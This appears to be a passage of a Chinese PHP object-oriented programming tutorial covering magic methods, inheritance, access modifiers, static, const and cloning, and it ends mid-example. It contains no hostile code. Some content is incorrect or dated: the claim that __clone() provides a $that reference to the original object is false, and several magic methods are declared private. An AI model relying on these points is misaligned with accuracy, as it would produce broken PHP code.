<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class Person  &#123;            //声明一个人类Person，其中包含的三个成员属性被封装起来</div><div class="line">		//下面是声明人的成员属性，全都使用了private关键字封装</div><div class="line">		private $name;       //第一个成员属性$name定义人的名子，此属性被封装</div><div class="line">		private $sex;         //第二个成员属性$sex定义人的性别，此属性被封装</div><div class="line">		private $age;         //第三个成员属性$age定义人的年龄，此属性被封装</div><div class="line"></div><div class="line">		//声明一个构造方法，将来创建对象时，为对象的成员属性赋予初值</div><div class="line">	    	function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=1) &#123;     //使用了默认参数</div><div class="line">			$this-&gt;name = $name;    //使用传入的参数$name为成员属性$this-&gt;name赋初值</div><div class="line">			$this-&gt;sex = $sex;       //使用传入的参数$sex为成员属性$this-&gt;sex赋初值</div><div class="line">			$this-&gt;age = $age;       //使用传入的参数$age为成员属性$this-&gt;age赋初值</div><div class="line">		&#125;</div><div class="line">		//在类中添加__get()方法，在直接获取属性值时自动调用一次，以属性名作为参数传入并处理</div><div class="line">		private function __get($propertyName)  &#123;    //在方法前使用private修饰，防止对象外部调用 </div><div class="line">			 if($propertyName==&quot;sex&quot;) &#123;          //如果参数传入的是”sex”则条件成立</div><div class="line">				return &quot;保密&quot;;                  //不让别人获取到性别，以“保密”替代</div><div class="line">			 &#125; else  if($propertyName==&quot;age&quot;) &#123;    //如果参数传入的是“age”则条件成立</div><div class="line">				if($this-&gt;age &gt; 30)               //如果对象中的年龄大于30时条件成立</div><div class="line">					return $this-&gt;age-10;	       //返回对象中虚假的年龄，比真实年龄小10岁</div><div class="line">				else                           //如果对象中的年龄不大于30时则执行下面代码</div><div class="line">					return $this-&gt;$propertyName;  //让访问都可以获取到对象中真实的年龄</div><div class="line">			 &#125; else &#123;                            //如果参数传入的是其它属性名则条件成立</div><div class="line">			 	return $this-&gt;$propertyName;      //对其它属性都没有限制，可以直接返回属性的值</div><div class="line">			 &#125; </div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$person1=new Person(&quot;张三&quot;, &quot;男&quot;, 40);   //通过Person类实例化的对象，并通过构造方法为属性赋初值</div><div class="line">	</div><div class="line">	echo &quot;姓名：&quot;.$person1-&gt;name.&quot;&lt;br&gt;&quot;;   //直接访问私有属性name，自动调用了__get()方法可以间接获取</div><div class="line">	echo &quot;性别：&quot;.$person1-&gt;sex.&quot;&lt;br&gt;&quot;;    //自动调用了__get()方法，但在方法中没有返回真实属性值</div><div class="line">	echo &quot;年龄：&quot;.$person1-&gt;age.&quot;&lt;br&gt;&quot;;    //自动调用了__get()方法，根据对象本身的情况会返回不同的值</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="魔法方法isset-和unset"><a href="#魔法方法isset-和unset" class="headerlink" title="魔法方法isset()和unset()"></a>魔法方法<strong>isset()和</strong>unset()</h4><p>isset()函数是用来测定变量是否存在的函数。传入一个变量作为参数，如果传入的变量存在则传回true,否则传回false。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bool __isset(string name)    //传入对象中的成员属性名作为参数，返回测定后的结果</div></pre></td></tr></table></figure>
<p>unset()的作用是删除指定的变量，参数为要删除的变量名称。也可以使用这个函数在对象外部删除对象中的成员属性，但这个对象中的成员属性必须是公有的才可以直接删除。如果对象中的成员属性被封装，就需要在类中添加“unset()”方法，才可以在对象的外部使用“unset()”方法帮助我们间接地将私有的成员属性删除。也可以在“unset()”方法中限制一些条件，删除一些重要的属性。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">void __unset(string name)</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">?php</div><div class="line">	class Person  &#123;           	 //声明一个人类Person，其中包含的三个成员属性被封装起来</div><div class="line">		//下面是声明人的成员属性，全都使用了private关键字封装</div><div class="line">		private $name;      	 //第一个成员属性$name定义人的名子，此属性被封装</div><div class="line">		private $sex;        	 //第二个成员属性$sex定义人的性别，此属性被封装</div><div class="line">		private $age;         	//第三个成员属性$age定义人的年龄，此属性被封装</div><div class="line"></div><div class="line">		//声明一个构造方法，将来创建对象时，为对象的成员属性赋予初值</div><div class="line">	    	function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=1) &#123;</div><div class="line">			$this-&gt;name = $name;  	  	//使用传入的参数$name为成员属性$this-&gt;name赋初值</div><div class="line">			$this-&gt;sex = $sex;      	 //使用传入的参数$sex为成员属性$this-&gt;sex赋初值</div><div class="line">			$this-&gt;age = $age;      	 //使用传入的参数$age为成员属性$this-&gt;age赋初值</div><div class="line">		&#125;</div><div class="line">	     	//当在对象外面使用isset()测定私用成员属性时，自动调用，并在内部测定扣传给外部的isset()结果</div><div class="line">		private function __isset($propertyName) &#123;   //需要一个参数，是测定的私有属性的名称</div><div class="line">			if($propertyName==&quot;name&quot;)         	//如果参数中传入的属性名等于”name’时条件成立</div><div class="line">				return false;                  //返回假，不充许在对象外部测定这个属性</div><div class="line">			return isset($this-&gt;$propertyName);   //其它的属性都可以被测定，并返回测定的结果</div><div class="line">   		&#125;</div><div class="line">         	//当在对象外面使用unset()方法删除私用属性时，自动被调用，并在内部把私用的成员属性删除</div><div class="line">   		private function __unset($propertyName) &#123;   //需要一个参数，是要删除的私有属性名称</div><div class="line">			if($propertyName==&quot;name&quot;)          //如果参数中传入的属性名等于”name”时条件成立</div><div class="line">				return;                       //退出方法，不充许删除对象中的name属性</div><div class="line">			unset($this-&gt;$propertyName);         //在对象的内部删除在对象外指定的私有属性</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		public function say()  //在类中声明说话的方法，将所有的私有属性说出</div><div class="line">		&#123;</div><div class="line">			echo &quot;我的名子叫：&quot;.$this-&gt;name.&quot;， 性别：&quot;.$this-&gt;sex.&quot;， 我的年龄是：&quot;.$this-&gt;age.&quot;。&lt;br&gt;&quot;;</div><div class="line">		&#125;		</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$person1=new Person(&quot;张三&quot;, &quot;男&quot;, 40);   //创建一个对象$person1，将成员属性分别赋上初值</div><div class="line">	</div><div class="line">	var_dump(isset($person1-&gt;name));        //输出bool(false)，不充许测定对象是否存在name属性</div><div class="line">	var_dump(isset($person1-&gt;sex));          //输出bool(true)，使用isset()测定对象中存在sex私有属性</div><div class="line">	var_dump(isset($person1-&gt;age));          //输出bool(true)，使用isset()测定对象中存在age私有属性</div><div class="line">	var_dump(isset($person1-&gt;id));           //输出bool(false)，使用isset()测定对象中不存在id属性</div><div class="line">	</div><div class="line">	unset($person1-&gt;name);                //删除对象中的私有属性name，但在__unset()中不充许删除</div><div class="line">	unset($person1-&gt;sex);                  //删除对象中的私有属性sex，删除成功</div><div class="line">	unset($person1-&gt;age);                  //删除对象中的私有属性age，删除成功</div><div class="line">	</div><div class="line">	$person1-&gt;say();  //对象中的sex和age属性被删除，输出：我的名子叫：张三， 性别：， 我的年龄是：。</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h2 id="继承性"><a href="#继承性" class="headerlink" title="继承性"></a>继承性</h2><h3 id="类继承的应用"><a href="#类继承的应用" class="headerlink" title="类继承的应用"></a>类继承的应用</h3><p>使用“extends”关键字实现多个类的单继承关系<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class Person &#123;           //声明一个人类，定义人所具有的一些其本的属性和功能成员，做为父类 </div><div class="line">		var $name;         //声明一个存储人的名子的成员</div><div class="line">		var $sex;           //声明一个存储人的性别的成员</div><div class="line">		var $age;           //声明一个存储人的年龄的成员</div><div class="line">		</div><div class="line">	    	function __construct($name=&quot;&quot;, $sex=&quot;男&quot;, $age=1) &#123;    //构造方法用来创建对象并初使化成员属性</div><div class="line">			$this-&gt;name = $name;           //为成员属性name在创建对象时赋初值</div><div class="line">			$this-&gt;sex = $sex;              //为成员属性sex在创建对象时赋初值</div><div class="line">			$this-&gt;age = $age;              //为成员属性age在创建对象时赋初值</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		function say()&#123;           //在人类在声明一个通用的说话方法，介绍一下自己</div><div class="line">			echo &quot;我的名子叫：&quot;.$this-&gt;name.&quot;， 性别：&quot;.$this-&gt;sex.&quot;， 我的年龄是：&quot;.$this-&gt;age.&quot;。&lt;br&gt;&quot;;</div><div class="line">		&#125;	</div><div class="line">		</div><div class="line">		function run() &#123;          //在人类是声明一个人的通用的走路方法</div><div class="line">			echo $this-&gt;name.&quot;正在走路。&lt;br&gt;&quot;;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	class Student extends Person &#123;   //声明一个学生类，使用extends关键字扩展（继承）Person类</div><div class="line">		var $school;             //在学生类中声明一个所在学校school的成员属性</div><div class="line">		</div><div class="line">		function study() &#123;        //在学生类中声明一个学生可以学习的方法</div><div class="line">			echo $this-&gt;name.&quot;正在&quot;.$this-&gt;school.&quot;学习&lt;br&gt;&quot;;</div><div class="line">		&#125;	</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	class Teacher extends Student &#123;  //再声明一个教师类，使用extends关键字扩展（继承）Student类</div><div class="line">		var $wage;              //在教师类中声明一个教师工资wage的成员属性</div><div class="line">		</div><div class="line">		function teaching() &#123;      //在教师类中声明一个教师可以教学的方法</div><div class="line">			echo $this-&gt;name.&quot;正在&quot;.$this-&gt;school.&quot;教学,每月工资为&quot;.$this-&gt;wage.&quot;。&lt;br&gt;&quot;;	</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	$teacher1=new Teacher(&quot;张三&quot;, &quot;男&quot;, 40);   //使用继承过来的构造方法创建一个教师对象</div><div class="line">	</div><div class="line">	$teacher1-&gt;school=&quot;edu&quot;;        //将一个教师对象中的所在学校的成员属性school赋值</div><div class="line">	$teacher1-&gt;wage=3000;         //将一个教师对象中的成员属性工资赋值</div><div class="line"></div><div class="line">	$teacher1-&gt;say();              //调用教师对象中的说话方法</div><div class="line">	$teacher1-&gt;study();            //调用教师对象中的学习方法</div><div class="line">	$teacher1-&gt;teaching();          //调用教师对象中的教学方法</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="访问类型控制"><a href="#访问类型控制" class="headerlink" title="访问类型控制"></a>访问类型控制</h3><p>PHP5支持如下三种访问修饰符，包括public、private和protected三种</p>
<h4 id="公有的访问修饰符public"><a href="#公有的访问修饰符public" class="headerlink" title="公有的访问修饰符public"></a>公有的访问修饰符public</h4><p>类中的成员将没有访问限制，所有的外部成员都可以访问这个类中的成员，在PHP 5之前的所有版本中，PHP中类的成员都是public的，而且在PHP5中如果类的成员没有指定成员访问修饰符，将被视为public。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var $property			//声明成员属性时，没有使用访问控制的修饰符，默认就是public的成员</div><div class="line">public $property			//使用public修饰符，控制此成员属性为公有的</div><div class="line">function fun()&#123;...&#125;			//声明成员方法时，没有使用访问控制的修饰符，默认就是public的成员</div><div class="line">public function fun()&#123;...&#125;			//使用public修饰符，控制此成员方法为公有的</div></pre></td></tr></table></figure></p>
<h4 id="私有的访问修饰符private"><a href="#私有的访问修饰符private" class="headerlink" title="私有的访问修饰符private"></a>私有的访问修饰符private</h4><p>当类中的成员被定义为private，对于同一类里的所有成员都没有访问限制，但对于该类的外部代码是不允许改变甚至操作的，对于该类的子类，也不能访问private修饰的成员。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class MyClass &#123;                     //声明一个类作为父类使用，将它的成员都声明为私有的</div><div class="line">		private $var1=100;              //声明一个私有的成员属性并给初值为100</div><div class="line"></div><div class="line">		private function printHello() &#123;    //声明一个成员方法使用private关键字设置为私有的</div><div class="line">			echo &quot;hello&lt;br&gt;&quot;;         //在方法中只有一条输出语句作为测试使用</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	class MyClass2 extends MyClass &#123;     //声明一个MyClass类的子类试图访问父类中的私有成员</div><div class="line">		function useProperty()          //在类中声明一个公有方法，访问父类中的私有成员</div><div class="line">		&#123;</div><div class="line">			echo &quot;输出从父类继承过来的成员属性值&quot;.$this-&gt;var1.&quot;&lt;br&gt;&quot;;    //访问父类中的私有属性</div><div class="line">			$this-&gt;printHello();                                         //访问父类中的私有方法</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$subObj=new MyClass2();          //初例化出子类对象</div><div class="line">	$subObj-&gt;useProperty();            //调用子类对象中的方法实现对父类私有成员的访问</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="保护的访问修饰符protected"><a href="#保护的访问修饰符protected" class="headerlink" title="保护的访问修饰符protected"></a>保护的访问修饰符protected</h4><p>被修饰为protected的成员，对于该类的子类以及子类都有访问权限，可以进行属性、方法的读及写操作。但不能被该类的外部代码访问，以及该子类的外部代码也不具有访问其属性和方法的权限。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class MyClass &#123;                      //声明一个类作为父类使用，将它的成员都声明为保护的</div><div class="line">		protected $var1=100;             //声明一个保护的成员属性并给初值为100</div><div class="line"></div><div class="line">		protected function printHello() &#123;    //声明一个成员方法使用protected关键字设置为保护的</div><div class="line">			echo &quot;hello&lt;br&gt;&quot;;           //在方法中只有一条输出语句作为测试使用</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	class MyClass2 extends MyClass &#123;     //声明一个MyClass类的子类试图访问父类中的保护成员</div><div class="line">		function useProperty()          //在类中声明一个公有方法，访问父类中的保护成员</div><div class="line">		&#123;</div><div class="line">			echo &quot;输出从父类继承过来的成员属性值&quot;.$this-&gt;var1.&quot;&lt;br&gt;&quot;;   //访问父类中受保护的属性</div><div class="line">			$this-&gt;printHello();                                        //访问父类中受保护的方法</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$subObj=new MyClass2();          //初例化出子类对象</div><div class="line">	$subObj-&gt;useProperty();            //调用子类对象中的方法实现对父类保护的成员访问</div><div class="line">     	echo $subObj-&gt;var1;               //试图访问类中受保护的成员，结果出错</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h2 id="常见的关键字和魔术方法"><a href="#常见的关键字和魔术方法" class="headerlink" title="常见的关键字和魔术方法"></a>常见的关键字和魔术方法</h2><h3 id="final关键字的应用"><a href="#final关键字的应用" class="headerlink" title="final关键字的应用"></a>final关键字的应用</h3><p>在PHP5中新增加了final关键字，它可以夹在类或类中方法前。但不能使用final标识成员属性，虽然final有常量的意思，但是PHP中定义常量是使用define()函数来完成。<br>final关键字的作用</p>
<ul>
<li>使用final标识的类，不能被继承</li>
<li>在类中使用final标识的成员方法，在子类中不能被覆盖</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    class MyClass &#123;                //声明一个类MyClass作为父类，在类中只声明一个成员方法</div><div class="line">		final function fun() &#123;       //声明一个成员方法并使用final标识，则不能在子类中覆盖</div><div class="line">			//方法体中的内容略</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	class MyClass2 extends MyClass &#123; //声明继承MyClass类的子类，在类中声明一个方法去覆盖父类中的方法</div><div class="line">		function fun() &#123;           //在子类中试图去覆盖父类中已被final标识的方法，结果出错</div><div class="line">			//方法体中的内容略</div><div class="line">		&#125;</div><div class="line">	&#125;	</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="static和const关键字的使用"><a href="#static和const关键字的使用" class="headerlink" title="static和const关键字的使用"></a>static和const关键字的使用</h3><h4 id="static关键字"><a href="#static关键字" class="headerlink" title="static关键字"></a>static关键字</h4><p>使用static关键字可以将类中的成员标识为静态的，即可以用来标识成员属性也可以标识成员方法。</p>
<p>类的静态属性非常类似于函数的全局变量。类中的静态成员是不需要对象而使用类名来直接访问的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">类名::静态成员属性名;			//在类的外部和成员方法中都可以使用这种方法访问静态成员属性</div><div class="line">类名::静态成员方法名();			//在类的外部的成员方法中都可以使用这个方法访问静态成员方法</div></pre></td></tr></table></figure></p>
<p>在类中声明的成员方法中，也可以使用关键字“self”来访问其他静态成员。因为静态成员是属于类的，而不属于任何对象，所以不能用$this来引用，可以使用self关键词。</p>
<p>如果在类的外部访问类中的静态成员，可以使用对象引用和使用类名访问，但通常选择使用类名来访问。如果在类内部的成员方法中访问其他的静态成员，通常使用self的形式去访问，最好不要直接用类名称。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class MyClass &#123;                 //声明一个MyClass类，用来演示如何使用静态成员</div><div class="line">		static $count;               //在类中声明一个静态成员属性count，用来统计对象被创建的次数</div><div class="line"></div><div class="line">		function __construct() &#123;      //每次创建一个对象就会自动调用一次这个构造方法</div><div class="line">			self::$count++;	       //使用self访问静态成员count，使其自增1</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		static function getCount() &#123;   //声明一个静态方法，在类外面直接使用类名就可以调用</div><div class="line">			return self::$count;     //在方法中使用self访问静态成员并返回</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	MyClass::$count=0;            //在类外面使用类名访问类中的静态成员，为其初使化赋值0</div><div class="line"></div><div class="line">	$myc1=new MyClass();         //通过MyClass类创建第一个对象，在构造方法中将count累加1</div><div class="line">	$myc2=new MyClass();         //通过MyClass类创建第二个对象，在构造方法中又为count累加1</div><div class="line">	$myc3=new MyClass();         //通过MyClass类创建第三个对象，在构造方法中再次为count累加1</div><div class="line">     </div><div class="line">	echo MyClass::getCount();      //在类外面使用类名访问类中的静态成员方法，获取静态属性的值 3</div><div class="line">     	echo $myc3-&gt;getCount();       //通过对象也可以访问类中的静态成员方法，获取静态属性的值 3</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="const关键字"><a href="#const关键字" class="headerlink" title="const关键字"></a>const关键字</h4><p>使用const关键字将类中的成员属性定义为常量，其访问的方式和静态成员一样，都是通过类名或者在成员方法中使用self关键字访问，也不能用对象来访问。标识为常量的属性是只读的，不能重新赋值，如果在程序中试图改变它的值，则会出现错误。所以在声明常量时一定要给初值，因为没有其他方式后期为常量赋值。注意，使用const是声明的常量名称前不要使用“$”符号，而且常量名称通常都是大写的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class MyClass &#123;   //声明一个MyClass类，在类中声明一个常量，和一个成员方法</div><div class="line">		 const CONSTANT = &apos;CONSTANT value&apos;;     //使用const声明一个常量，并直接赋上初使值</div><div class="line"></div><div class="line">   		 function showConstant() &#123;                 //声明一个成员方法并在其内部访问本类中的常量</div><div class="line">       			 echo  self::CONSTANT.&quot;&lt;br&gt;&quot;;   //使用self访问常量，注意常量前不要加“$”</div><div class="line">   		 &#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	echo MyClass::CONSTANT . &quot;&lt;br&gt;&quot;;             //在类外部使用类名称访问常量，也不要加”$”</div><div class="line">	$class = new MyClass();                        //通过类MyClass创建一个对象引用$class</div><div class="line">	$class-&gt;showConstant();                        //调用对象中的方法</div><div class="line">	// echo $class::CONSTANT;                     //通过对象名称访问常量是不允许的</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="克隆对象"><a href="#克隆对象" class="headerlink" title="克隆对象"></a>克隆对象</h3><p>在PHP中使用“clone”关键词克隆对象，克隆出一个完全一样的对象，克隆以后，原来和副本两个对象完全独立互不干扰。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class Person &#123;    //声明类Person，并在其中声明了三个成员属性，一个构造方法以及一个成员方法</div><div class="line">		private $name;     //第一个私有成员属性$name用于存储人的名子</div><div class="line">		private $sex;       //第二个私有成员属性$sex用于存储人的性别</div><div class="line">		private $age;       //第三个私有成员属性$age用于存储人的age</div><div class="line"></div><div class="line">		function __construct($name=&quot;&quot;, $sex=&quot;&quot;, $age=1) &#123;  //构造方法在对象诞生时为成员属性赋初值</div><div class="line">			$this-&gt;name=$name;</div><div class="line">			$this-&gt;sex=$sex;</div><div class="line">			$this-&gt;age=$age;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		function say()  &#123;       //一个成员方法用于打印出自己对象中全部的成员属性值</div><div class="line">			echo &quot;我的名子叫：&quot;.$this-&gt;name.&quot; 性别：&quot;.$this-&gt;sex.&quot; 我的年龄是：&quot;.$this-&gt;age.&quot;&lt;br&gt;&quot;;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$p1=new Person(&quot;张三&quot;, &quot;男&quot;, 20);   //创建一个对象并通过构造方法为对象中所有成员属性赋初值</div><div class="line">	$p2=clone $p1;                   //使用clone关键字克隆（复制）对象，创建一个对象的副本</div><div class="line">    	 // $p3=$p1                       //这不是复制对象，而是为对象多复制出一个访问该对象的引用</div><div class="line">	$p1-&gt;say();                      //调用原对象中的说话方法，打印原对象中的全部属性值</div><div class="line">	$p2-&gt;say();                      //调用副本对象中的说话方法，打印出克隆对象的全部属性值</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>如果需要为克隆后的副本对象在克隆是重新为成员属性赋初值，则可以在类中声明一个魔术方法clone()。该方法是在对象克隆时自动调用的，所以就可以通过此方法为克隆后的副本重新初始化。__clone()方法不需要任何参数，该方法中自动包含$this和$that两个对象的引用，$this是副本对象的引用，而$that则是原本对象的引用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class Person &#123;    //声明类Person，并在其中声明了三个成员属性，一个构造方法以及一个成员方法</div><div class="line">		private $name;     //第一个私有成员属性$name用于存储人的名子</div><div class="line">		private $sex;       //第二个私有成员属性$sex用于存储人的性别</div><div class="line">		private $age;       //第三个私有成员属性$age用于存储人的age</div><div class="line"></div><div class="line">		function __construct($name=&quot;&quot;, $sex=&quot;&quot;, $age=1) &#123;  //构造方法在对象诞生时为成员属性赋初值</div><div class="line">			$this-&gt;name=$name;</div><div class="line">			$this-&gt;sex=$sex;</div><div class="line">			$this-&gt;age=$age;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		function __clone() &#123;     //声明此方法则在对象克隆时自动调用，用来为新对象重新赋值</div><div class="line">			$this-&gt;name=&quot;我是&quot;.$that-&gt;name.&quot;的副本&quot;;  //为副本对象中的name属性重新赋值</div><div class="line">			$this-&gt;age=10;                          //为副本对象中的age属性重新赋值</div><div class="line">		&#125;		</div><div class="line"></div><div class="line">		function say()  &#123;       //一个成员方法用于打印出自己对象中全部的成员属性值</div><div class="line">			echo &quot;我的名子叫：&quot;.$this-&gt;name.&quot; 性别：&quot;.$this-&gt;sex.&quot; 我的年龄是：&quot;.$this-&gt;age.&quot;&lt;br&gt;&quot;;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$p1=new Person(&quot;张三&quot;, &quot;男&quot;, 20);   //创建一个对象并通过构造方法为对象中所有成员属性赋初值</div><div class="line">	$p2=clone $p1;                   //使用clone克隆（复制）对象，并自动调用类中的__clone()方法 </div><div class="line">    	$p1-&gt;say();                      //调用原对象中的说话方法，打印原对象中的全部属性值</div><div class="line">	$p2-&gt;say();                      //调用副本对象中的说话方法，打印出克隆对象的全部属性值</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="类中通用的方法-toString"><a href="#类中通用的方法-toString" class="headerlink" title="类中通用的方法__toString()"></a>类中通用的方法__toString()</h3><p>魔法方法__toString()是快速获取对象的字符串表示的最便捷的方式，是在直接输出对象引用时自动调用的方法。通常在此方法中返回的字符串是使用对象中多个属性值连接而成的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	class TestClass &#123;                 //声明一个测试类，在类中声明一个成员属性和一个__toString()方法</div><div class="line">   		private $foo;                //在类中声明的一个成员方法</div><div class="line"></div><div class="line">    		function __construct($foo) &#123;  